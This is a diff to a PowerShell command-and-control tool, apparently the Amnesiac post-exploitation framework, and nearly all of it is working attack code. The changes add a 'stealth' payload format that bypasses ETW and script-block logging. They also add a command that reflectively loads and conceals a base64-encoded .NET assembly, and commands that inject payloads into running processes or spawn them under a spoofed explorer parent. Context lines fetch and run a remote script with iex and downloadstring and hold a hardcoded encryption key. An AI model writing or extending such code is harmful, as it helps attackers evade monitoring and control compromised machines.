@@ -2671,9 +2671,16 @@ function InteractWithPipeSession{
 				$global:payloadformat = 'exe'
 				Write-Output ""
 				Write-Output " [+] Payload format: exe"
+				if (-not $global:DiskMode) { Write-Output " [!] exe format requires disk write. Enable with 'diskmode on' or switch format." }
 				Write-Output ""
 			}
 			elseif($global:payloadformat -eq 'exe'){
+				$global:payloadformat = 'stealth'
+				Write-Output ""
+				Write-Output " [+] Payload format: stealth (ETW+SBL bypass, random vars, gzip)"
+				Write-Output ""
+			}
+			elseif($global:payloadformat -eq 'stealth'){
 				$global:payloadformat = 'b64'
 				Write-Output ""
 				Write-Output " [+] Payload format: cmd(b64)"
@@ -2681,7 +2688,7 @@ function InteractWithPipeSession{
 			}
 			continue
 		}
-		
+
 		elseif($Command -eq "Monitor"){
 			
 			$rawCommand = "iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1');TGT_Monitor -Timeout 86400 -EncryptionKey `"#Amn3siacP@ssw0rd!#`""
@@ -3200,6 +3207,39 @@ function InteractWithPipeSession{
 			continue
 		}
 		
+		elseif ($command -eq "load loader") {
+			if ([string]::IsNullOrEmpty($AmnesiacLoaderB64)) {
+				Write-Output " [-] AmnesiacLoader not embedded. Run AmnesiacLoader\Build.ps1 first."
+			} else {
+				Write-Output " [*] Delivering AmnesiacLoader to session..."
+				$loadCmd = "`$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String('$AmnesiacLoaderB64'));[AmnesiacLoader.Stomper]::ConcealLoadedAssembly(`$_la)"
+				$sw.WriteLine($loadCmd)
+				$sw.Flush()
+				$resp = ""
+				while ($true) { $ln = $sr.ReadLine(); if ($ln -eq $global:EndMarker) { break }; $resp += "$ln`n" }
+				Write-Output " [+] AmnesiacLoader active and concealed."
+			}
+			continue
+		}
+
+		elseif ($command -match "^Migrate ps new (.+)") {
+			$procPath = $Matches[1]
+			$ppid = try { (Get-Process -Name explorer -ErrorAction SilentlyContinue | Select-Object -First 1).Id } catch { 0 }
+			if (-not $ppid) { $ppid = 0 }
+			$sw.WriteLine("[AmnesiacLoader.Injector]::SpawnUnmanagedPS('$procPath', (iex 'New-PayloadScript' | Select-Object -ExpandProperty RawScript), $ppid)")
+			$sw.Flush()
+			while ($true) { $ln = $sr.ReadLine(); if ($ln -eq $global:EndMarker) { break }; Write-Output $ln }
+			continue
+		}
+
+		elseif ($command -match "^Migrate ps (\d+)") {
+			$targetPid = $Matches[1]
+			$sw.WriteLine("[AmnesiacLoader.Injector]::InjectUnmanagedPS($targetPid, (iex 'New-PayloadScript' | Select-Object -ExpandProperty RawScript))")
+			$sw.Flush()
+			while ($true) { $ln = $sr.ReadLine(); if ($ln -eq $global:EndMarker) { break }; Write-Output $ln }
+			continue
+		}
+
 		elseif ($command -like "Migrate *" -OR $command -like "Migrate2 *") {
 			
 			$commandParts = $command -split '\s+', 2
